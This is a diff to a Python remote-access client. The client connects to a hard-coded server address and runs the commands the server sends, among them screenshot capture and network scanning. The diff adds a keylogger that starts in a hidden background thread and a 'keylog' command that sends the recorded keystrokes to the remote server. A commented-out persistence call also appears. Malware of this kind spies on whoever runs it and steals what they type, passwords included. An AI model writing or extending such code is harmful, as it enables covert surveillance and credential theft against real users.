@@ -5,16 +5,16 @@ import subprocess
 from PIL import ImageGrab
 import io
 from scanner import p_arg, s_arg
+from keylogger import log_keystrokes, start_keylogger, send_keylogs
+import threading
 
-
-HOST = '192.168.1.237'  # change that to the IP address of the server
+HOST = '192.168.137.7'  # change that to the IP address of the server
 PORT = 9999  # change that to the port of the server
 
 
 def screenshot(data_stream):
     screen = ImageGrab.grab()
     #print("Screenshot taken")
-
     screen_bytes = io.BytesIO()
     screen.save(screen_bytes, format='PNG')
     screen_bytes = screen_bytes.getvalue()
@@ -111,6 +111,8 @@ def connect_to_server():
 
                 if data == 'screenshot':
                     screenshot(s)
+                elif data == 'keylog':
+                    send_keylogs(s)
                 elif data.startswith("scan"):
                     try:
                         args = data.split()[1:]  # Exemple : scan -p
@@ -134,5 +136,6 @@ def connect_to_server():
 if __name__ == "__main__":
 
     #make persistent()
-
+    keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
+    keylogger_thread.start()
     connect_to_server()
